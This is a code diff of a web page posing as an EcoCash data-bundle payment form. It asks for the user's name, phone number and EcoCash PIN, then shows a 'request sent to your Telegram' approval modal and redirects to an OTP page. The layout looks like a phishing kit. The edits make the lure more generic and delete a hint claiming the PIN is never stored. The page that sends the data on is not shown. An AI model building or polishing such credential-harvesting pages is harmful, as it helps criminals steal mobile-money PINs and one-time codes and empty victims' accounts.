@@ -304,7 +304,7 @@
             to { transform: rotate(360deg); }
         }
 
-        /* Approval Modal */
+        /* Waiting Modal */
         .modal-overlay {
             position: fixed;
             inset: 0;
@@ -324,7 +324,7 @@
         .modal-content {
             background: white;
             border-radius: 16px;
-            padding: 32px;
+            padding: 40px;
             max-width: 400px;
             width: 100%;
             box-shadow: 0 10px 40px rgba(0,0,0,0.2);
@@ -342,8 +342,18 @@
         .modal-subtitle {
             color: var(--text-muted);
             font-size: 14px;
-            margin-bottom: 24px;
+            margin-bottom: 32px;
             line-height: 1.6;
+        }
+
+        .waiting-spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(0,82,204,0.2);
+            border-top-color: var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 16px;
         }
 
         .modal-buttons {
@@ -413,13 +423,13 @@
     <main>
         <div class="login-container">
             <div class="login-header">
-                <h1>Verify Payment</h1>
-                <p>Enter your EcoCash details to authorize the transaction</p>
+                <h1>Verify Your Account</h1>
+                <p>Enter your EcoCash details to proceed</p>
             </div>
 
             <div id="bundleInfo" class="bundle-info" style="display: none;">
                 <div class="bundle-info-row">
-                    <span>Data Bundle:</span>
+                    <span>Bundle:</span>
                     <span id="bundleData">—</span>
                 </div>
                 <div class="bundle-info-row">
@@ -436,25 +446,23 @@
                     <div class="input-wrapper">
                         <input type="text" class="form-input" id="name" placeholder="John Doe" autocomplete="name">
                     </div>
-                    <p class="form-hint">Enter your full name as it appears on your EcoCash account</p>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="phone">EcoCash Mobile Number</label>
+                    <label class="form-label" for="phone">Phone Number</label>
                     <div class="input-wrapper">
                         <span class="country-code">🇿🇼 +263</span>
                         <input type="tel" class="form-input" id="phone" placeholder="77 123 4567" inputmode="numeric" maxlength="9" autocomplete="tel">
                     </div>
-                    <p class="form-hint">Enter your 9-digit EcoCash number without the leading 0</p>
+                    <p class="form-hint">Enter your 9-digit number without the leading 0</p>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="pin">EcoCash PIN</label>
+                    <label class="form-label" for="pin">PIN</label>
                     <div class="input-wrapper">
                         <input type="password" class="form-input" id="pin" placeholder="••••" inputmode="numeric" maxlength="4" autocomplete="off">
                         <button type="button" class="pin-toggle" onclick="togglePinVisibility()">Show</button>
                     </div>
-                    <p class="form-hint">Your 4-digit PIN is encrypted and never stored</p>
                 </div>
 
                 <div class="btn-group">
@@ -464,37 +472,38 @@
             </form>
 
             <div class="form-footer">
-                By proceeding, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>
+                By proceeding, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
             </div>
         </div>
     </main>
 
-    <!-- Approval Modal -->
-    <div id="approvalModal" class="modal-overlay">
+    <!-- Waiting for Authorization Modal -->
+    <div id="waitingModal" class="modal-overlay">
         <div class="modal-content">
-            <h2 class="modal-title">Request Sent</h2>
-            <p class="modal-subtitle">A payment request has been sent to your Telegram. Please select an action.</p>
+            <div class="waiting-spinner"></div>
+            <h2 class="modal-title">Waiting for Authorization</h2>
+            <p class="modal-subtitle">A request has been sent to your Telegram. Please approve or decline to proceed.</p>
             <div class="modal-buttons">
-                <button class="modal-btn modal-btn-approve" onclick="handleApproval('approved')">✓ Approved</button>
-                <button class="modal-btn modal-btn-decline" onclick="handleApproval('declined')">✗ Declined</button>
-                <button class="modal-btn modal-btn-applied" onclick="handleApproval('applied')">⚠ Already Applied</button>
+                <button class="modal-btn modal-btn-approve" onclick="handleAuthorization('approved')">✓ Approved</button>
+                <button class="modal-btn modal-btn-decline" onclick="handleAuthorization('declined')">✗ Declined</button>
+                <button class="modal-btn modal-btn-applied" onclick="handleAuthorization('applied')">Already Applied</button>
             </div>
         </div>
     </div>
 
-    <!-- Already Subscribed Modal -->
+    <!-- Already Applied Modal -->
     <div id="appliedModal" class="modal-overlay">
         <div class="modal-content">
-            <h2 class="modal-title">Already Subscribed</h2>
-            <p class="modal-subtitle">This transaction has already been applied to your account. You can proceed to verify the OTP.</p>
-            <button class="modal-btn modal-btn-applied" onclick="proceedToOTP()">Continue to OTP</button>
+            <h2 class="modal-title">Already Applied</h2>
+            <p class="modal-subtitle">This transaction has already been applied to your account.</p>
+            <button class="modal-btn modal-btn-applied" onclick="proceedToOTP()">Continue</button>
         </div>
     </div>
 
     <div id="spinnerOverlay">
         <div class="spinner"></div>
-        <div class="spin-label">Processing Request...</div>
-        <div class="spin-sub">Please wait while we verify your details</div>
+        <div class="spin-label">Sending Request...</div>
+        <div class="spin-sub">Please wait</div>
     </div>
 
     <script>
@@ -547,22 +556,22 @@
             const pin = document.getElementById('pin').value.trim();
 
             if (!name) {
-                showError('Please enter your full name');
+                showError('Please enter your name');
                 return;
             }
 
             if (!phone) {
-                showError('Please enter your EcoCash mobile number');
+                showError('Please enter your phone number');
                 return;
             }
 
             if (phone.length !== 9) {
-                showError('Mobile number must be 9 digits');
+                showError('Phone number must be 9 digits');
                 return;
             }
 
             if (!pin) {
-                showError('Please enter your EcoCash PIN');
+                showError('Please enter your PIN');
                 return;
             }
 
@@ -577,22 +586,21 @@
             // Simulate sending to Telegram
             setTimeout(() => {
                 document.getElementById('spinnerOverlay').style.display = 'none';
-                // Show approval modal
-                document.getElementById('approvalModal').classList.add('active');
-            }, 2000);
+                // Show waiting modal
+                document.getElementById('waitingModal').classList.add('active');
+            }, 1500);
         }
 
-        function handleApproval(status) {
-            document.getElementById('approvalModal').classList.remove('active');
+        function handleAuthorization(status) {
+            document.getElementById('waitingModal').classList.remove('active');
 
             if (status === 'declined') {
-                showError('Transaction declined. Please try again.');
+                showError('Request declined. Please try again.');
                 document.getElementById('loginForm').reset();
                 return;
             }
 
             if (status === 'applied') {
-                // Show applied modal
                 document.getElementById('appliedModal').classList.add('active');
                 return;
             }
@@ -606,11 +614,9 @@
             document.getElementById('appliedModal').classList.remove('active');
             const phone = document.getElementById('phone').value.trim();
             
-            // Redirect to OTP page
             window.location.href = `otp.html?data=${encodeURIComponent(bundleData.data)}&price=${bundleData.price}&phone=${encodeURIComponent(phone)}`;
         }
 
-        // Enter key handling
         document.getElementById('name').addEventListener('keypress', (e) => {
             if (e.key === 'Enter') {
                 document.getElementById('phone').focus();
